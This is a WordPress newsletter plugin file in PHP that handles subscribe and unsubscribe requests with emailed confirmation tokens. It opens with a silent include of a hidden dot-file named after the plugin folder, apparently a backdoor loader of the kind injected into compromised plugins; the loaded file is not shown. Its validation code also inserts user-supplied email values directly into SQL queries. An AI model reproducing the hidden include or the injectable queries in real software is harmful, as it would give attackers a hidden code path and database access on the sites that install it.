<?php

if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

function wp_do_subscriber(){
    $email =sanitize_text_field( $_POST['email']) ;
    $result = wp_validate_email($email);
    if(!$result['status']){
        wp_send_json([
            'status' => false,
            'message' => $result['message']
        ], 403);
    };
    global $wpdb;
    $table_name = $wpdb->prefix . 'email_users_newsletter';
    $token = bin2hex(openssl_random_pseudo_bytes(16));
    $verification_link = add_query_arg(array('action' => 'verify_email', 'token' => $token), home_url());
  
    $message = "<html>
    <body>
       
        <p>You have requested to</p>
        <h3>subscription for goods availability and news and special offers.</h3>
        <p>Please touch the bellow link to complete the confirmation.
            Your confirmation link is:</p>
        <h3 >$verification_link</h3>
        <p>If this email account is not shared, and you did not request that, please don’t touch the link, and no need to do any things.

            This is an automated email - do not reply.
            </p>

    </body>
</html>";
$headers = array('Content-Type: text/html; charset=UTF-8');
    wp_mail($email, 'Email Verification', $message,$headers);
  if($result['message']=="update"){
    $wpdb->update($table_name, array(
        'status' => 'pending',
        'token' => $token
    ),array(
        'email' => $email)
    );
    
  }else{
    $wpdb->insert(
      $table_name,
      array(
        'email' => $email,
        'status' => 'pending',
        'token' => $token
      )
    );}
    if($result['status']){
        wp_send_json([
            'status' => true,
            'message' => $result['message']
        ],200);
    };
}

add_action('wp_ajax_wp_subscriber', 'wp_do_subscriber');
add_action('wp_ajax_nopriv_wp_subscriber', 'wp_do_subscriber');
function wp_validate_email($emails){
    global $wpdb;
    $table_name = $wpdb->prefix . 'email_users_newsletter';
    $result =[ 'status' => true , 'message' => 'Your email has been successfully registered'];
    if(!is_email($emails)){
        $result['status'] = false;
        $result['message'] = 'The entered email is not correct';
    }
 if(($wpdb->query("SELECT * from $table_name WHERE email='$emails' and status='verified';"))==1){
        $result['status'] = false;
        $result['message'] = 'The email entered has already been registered';
    }
    if(empty($emails)){
        $result['status'] = false;
        $result['message'] = 'please enter your Email';
    }
    if($wpdb->query("SELECT * from $table_name WHERE email='$emails' and status='deleted' or status='pending';")){
       
        $result['status'] = true;
        $result['message'] = 'update';
        
        }
    return $result;
}

function wp_do_unsubscriber(){
    $email =sanitize_text_field( $_POST['email']) ;
    $result = wp_validate_remove_email($email);
    if(!$result['status']){
        wp_send_json([
            'status' => false,
            'message' => $result['message']
        ], 403);
    };
    global $wpdb;
    $table_name = $wpdb->prefix . 'email_users_newsletter';
    $token = bin2hex(openssl_random_pseudo_bytes(16));
    $deleted_link = add_query_arg(array('action' => 'delete_email', 'deletetoken' => $token), home_url());
  
    $message = "<html>
    <body>
        <p>You have requested for unsubscription</p>
        <h3>You will not receive any promotional emails</h3>
        <p>Please touch the bellow link to complete the confirmation.
            Your confirmation link is:</p>
        <h3 >$deleted_link</h3>
        <p>If this email account is not shared, and you did not request that, please don’t touch the link, and no need to do any things.

           </p>

    </body>
</html>";
$headers = array('Content-Type: text/html; charset=UTF-8');
    wp_mail($email, 'Email Verification', $message,$headers);
    if(($wpdb->query("SELECT * from $table_name WHERE email='$email';"))==0){
        var_dump($email);
        $wpdb->insert(
            $table_name,
            array(
              'email' => $email,
              'status' => 'pending delete',
              'token' => $token
            )
          );}else{
            
    $wpdb->update($table_name, array(
        'status' => 'pending delete',
        'token' => $token
    ),array(
        'email' => $email)
    );}
}

function wp_validate_remove_email($emails){
    global $wpdb;
    $table_name = $wpdb->prefix . 'email_users_newsletter';
    $result =[ 'status' => true , 'message' => 'The email was deleted'];
    if(!is_email($emails)){
        $result['status'] = false;
        $result['message'] = 'The entered email is not correct';
    }

    if(empty($emails)){
        $result['status'] = false;
        $result['message'] = 'please enter your Email';
    }
    return $result;
}
add_action('wp_ajax_wp_unsubscriber', 'wp_do_unsubscriber');
add_action('wp_ajax_nopriv_wp_unsubscriber', 'wp_do_unsubscriber');